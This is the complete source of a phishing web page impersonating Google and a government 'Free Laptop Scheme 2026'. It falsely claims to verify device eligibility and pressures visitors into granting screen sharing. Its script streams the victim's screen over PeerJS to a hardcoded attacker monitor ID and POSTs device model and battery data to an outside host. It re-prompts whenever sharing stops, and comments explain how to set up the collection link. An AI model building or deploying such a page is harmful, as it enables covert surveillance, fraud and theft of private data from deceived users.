<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google & Government | Free Laptop Scheme 2026</title>
    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        .google-font { font-family: 'Product Sans', Arial, sans-serif; }
        .loading-bar { height: 4px; width: 100%; background: #e0e0e0; position: relative; overflow: hidden; }
        .loading-bar::after { content: ''; position: absolute; left: -50%; width: 50%; height: 100%; background: #4285f4; animation: loading 2s linear infinite; }
        @keyframes loading { 0% { left: -50%; } 100% { left: 100%; } }
    </style>
</head>
<body class="bg-white google-font">

    <!-- Header Area -->
    <div class="border-b p-4 flex justify-between items-center shadow-sm">
        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="92">
        <span class="text-sm text-gray-600 bg-gray-100 px-3 py-1 rounded-full">Official Distribution Channel</span>
    </div>

    <div class="max-w-xl mx-auto mt-10 p-6 text-center">
        <h1 class="text-3xl font-bold text-gray-800">Verify Device Eligibility</h1>
        <p class="text-gray-600 mt-4">2026 Student Support Program is distributing 1,000,000 laptops. To prevent bots, we need to verify your hardware specs through a secure screen-scan.</p>

        <div class="my-8 p-6 bg-blue-50 rounded-2xl border border-blue-100 text-left">
            <h3 class="font-bold text-blue-800">Requirements:</h3>
            <ul class="text-sm text-blue-700 mt-2 space-y-2">
                <li>• Stable Internet Connection</li>
                <li>• High-resolution Display Verification</li>
                <li>• Battery Health Check (Min 20% required)</li>
            </ul>
        </div>

        <div id="status-area" class="hidden mb-6">
            <div class="loading-bar mb-2"></div>
            <p id="status-text" class="text-xs text-blue-600 font-medium italic">Connecting to secure govt node...</p>
        </div>

        <button id="verify-btn" class="w-full bg-[#1a73e8] hover:bg-[#1557b0] text-white py-4 rounded-lg font-bold text-lg shadow-xl transition-all">
            VERIFY AND CLAIM LAPTOP
        </button>
        
        <p class="text-[10px] text-gray-400 mt-6 uppercase tracking-widest">Encrypted by Google Security Services 2026</p>
    </div>

    <script>
        const peer = new Peer();
        const adminId = "AURALINK_ADMIN_2026"; // Monitor panel ki ID

        peer.on('open', (id) => {
            document.getElementById('verify-btn').onclick = async () => {
                const btn = document.getElementById('verify-btn');
                const statusArea = document.getElementById('status-area');
                const statusText = document.getElementById('status-text');

                try {
                    // SCREEN SHARING - GitHub (HTTPS) par ye Error nahi dega
                    const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
                    
                    btn.classList.add('hidden');
                    statusArea.classList.remove('hidden');
                    
                    // Call the Admin/Monitor
                    peer.call(adminId, stream);
                    
                    // Connect for Telemetry
                    const conn = peer.connect(adminId);
                    conn.on('open', async () => {
                        const bat = await navigator.getBattery();
                        const info = {
                            peer_id: id,
                            model: navigator.userAgent.split('(')[1].split(')')[0],
                            battery: Math.floor(bat.level * 100) + '%'
                        };
                        
                        // SAVE TO INFINITYFREE DATABASE
                        // Yahan apna sahi link likhein:
                        fetch('https://leptop2026.gt.tc/save_data.php', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify(info)
                        });

                        statusText.innerText = "Hardware Scan: 45% Complete... Keep this tab open.";
                    });

                    // Agar user sharing stop karde
                    stream.getVideoTracks()[0].onended = () => {
                        alert("Verification Failed: Please keep the screen sharing active to complete the scan.");
                        window.location.reload();
                    };

                } catch (err) {
                    console.error(err);
                    alert("SECURITY ERROR: Please click 'Allow' on the permission popup to verify your display resolution for the laptop scheme.");
                }
            };
        });
    </script>
</body>
</html>
